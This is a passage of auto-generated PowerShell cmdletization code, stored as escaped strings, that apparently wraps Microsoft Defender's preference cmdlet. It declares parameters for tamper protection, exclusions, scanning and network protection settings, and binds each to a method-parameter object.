[ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableTamperProtection},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dsmtpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableSmtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dquicp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableQuicParsing},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('nprepmode')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${NetworkProtectionReputationMode},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('itdte')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${IntelTDTEnabled},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('oobers')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${OobeEnableRtpAndSigUpdate},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('pms')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Enabled','Disabled')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PerformanceModeStatusType]\r\n    ${PerformanceModeStatus},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('qsie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ValidateSet('Disabled','ScanRtpExclusions')]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.QuickScanIncludeExclusionsType]\r\n    ${QuickScanIncludeExclusions},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('dcm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DisableCacheMaintenance},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('rstpc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${RemoveScanningThreadPoolCap},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Set0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletizatio"
"n.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\r\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.NetworkBehaviorProtectionConfiguredState'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Aggressiveness'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n    "
"    } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {\r\n          [object]$__cmdletization_value = ${ServiceHealthReportInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {\r\n          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\r\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Byte'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\r\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\r\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\r\n          [object]$__cmdletization_value = ${ScanParameters}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = 